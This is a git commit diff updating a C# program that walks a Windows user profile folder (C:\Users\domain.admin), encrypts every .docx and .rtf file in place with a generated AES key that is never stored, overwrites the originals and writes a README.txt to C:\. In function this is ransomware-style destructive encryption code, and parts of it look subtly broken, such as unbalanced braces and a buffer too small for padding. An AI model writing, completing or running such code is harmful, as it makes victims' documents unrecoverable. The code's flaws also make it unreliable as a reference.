bd36c393f785a5fddf66605771269609ff8627d1
Ma Hoang Minh <68465390+kenji-winux@users.noreply.github.com>
2023-05-17 14:55:52 +0700

    Update encryption.cs

--- encryption.cs
+++ encryption.cs
@@ -10,12 +10,23 @@ namespace FileEncryption
     {
         private const int CALG_AES_128 = 0x0000660e;
         private const int CRYPT_EXPORTABLE = 0x00000001;
+        private const int PROV_RSA_AES = 24;
+        private const int KP_KEYLEN = 9;
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool CryptAcquireContext(out IntPtr hProv, string pszContainer, string pszProvider, int dwProvType, int dwFlags);
 
         [DllImport("advapi32.dll", SetLastError = true)]
         private static extern bool CryptGenKey(IntPtr hProv, int Algid, int dwFlags, out IntPtr phKey);
 
         [DllImport("advapi32.dll", SetLastError = true)]
-        private static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool Final, int dwFlags, IntPtr pbData, ref int pdwDataLen, int dwBufLen);
+        private static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool Final, int dwFlags, byte[] pbData, ref int pdwDataLen, int dwBufLen);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool CryptDestroyKey(IntPtr hKey);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool CryptReleaseContext(IntPtr hProv, int dwFlags);
 
         public static void EncryptFiles(string directoryPath)
         {
@@ -24,8 +35,7 @@ namespace FileEncryption
 
             try
             {
-                // Create a new AES-128 key
-                if (!CryptAcquireContext(out hProvider, null, null, 1, 0))
+                if (!CryptAcquireContext(out hProvider, null, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, 0))
                 {
                     throw new CryptographicException(Marshal.GetLastWin32Error());
                 }
@@ -35,7 +45,6 @@ namespace FileEncryption
                     throw new CryptographicException(Marshal.GetLastWin32Error());
                 }
 
-                // Encrypt files in the directory
                 string[] fileExtensions = { ".docx", ".rtf" };
 
                 foreach (string file in Directory.EnumerateFiles(directoryPath, "*.*", SearchOption.AllDirectories))
@@ -48,7 +57,6 @@ namespace FileEncryption
                     }
                 }
 
-                // Create README.txt file
                 string readmePath = Path.Combine("C:\\", "README.txt");
                 File.WriteAllText(readmePath, "done");
             }
@@ -68,48 +76,41 @@ namespace FileEncryption
 
         private static void EncryptFile(string filePath, IntPtr hKey)
         {
-            using (FileStream fileStream = File.Open(filePath, FileMode.Open, FileAccess.ReadWrite))
+            byte[] fileData = File.ReadAllBytes(filePath);
+            byte[] encryptedData = EncryptData(fileData, hKey);
+
+            using (FileStream fileStream = new FileStream(filePath, FileMode.Create))
             {
-                using (MemoryMappedFile mmf = MemoryMappedFile.CreateFromFile(fileStream, null, 0, MemoryMappedFileAccess.ReadWrite, null, HandleInheritability.None, false))
-                {
-                    using (MemoryMappedViewAccessor accessor = mmf.CreateViewAccessor())
-                    {
-                        long length = accessor.Capacity;
-                        byte[] data = new byte[length];
-                        accessor.ReadArray(0, data, 0, data.Length);
-
-                        CryptEncrypt(hKey, IntPtr.Zero, true, 0, data, ref data.Length, data.Length);
-
-                        accessor.WriteArray(0, data, 0, data.Length);
-                    }
-                }
+                fileStream.Write(encryptedData, 0, encryptedData.Length);
             }
         }
 
-        [DllImport("advapi32.dll", SetLastError = true)]
-        private static extern bool CryptAcquireContext(out IntPtr phProv, string pszContainer, string pszProvider, int dwProvType, int dwFlags);
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        private static extern bool CryptReleaseContext(IntPtr hProv, int dwFlags);
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        private static extern bool CryptDestroyKey(IntPtr hKey);
-    }
-    public static class Program
-    {
-        public static void Main()
+        private static byte[] EncryptData(byte[] data, IntPtr hKey)
         {
-           string directoryPath = @"C:\Users\domain.admin";
+            byte[] encryptedData = new byte[data.Length];
+            Buffer.BlockCopy(data, 0, encryptedData, 0, data.Length);
 
-            try
-            {
-                FileEncryptor.EncryptFiles(directoryPath);
-                Console.WriteLine("Encryption complete.");
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Encryption failed: " + ex.Message);
-            }
+            int dataLength = encryptedData.Length;
+            CryptEncrypt(hKey, IntPtr.Zero, true, 0, encryptedData, ref dataLength, dataLength);
+
+            return encryptedData;
+}
+}
+public static class Program
+{
+    public static void Main()
+    {
+        string directoryPath = @"C:\Users\domain.admin";
+
+        try
+        {
+            FileEncryptor.EncryptFiles(directoryPath);
+            Console.WriteLine("Encryption complete.");
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("Encryption failed: " + ex.Message);
         }
     }
+}
 }
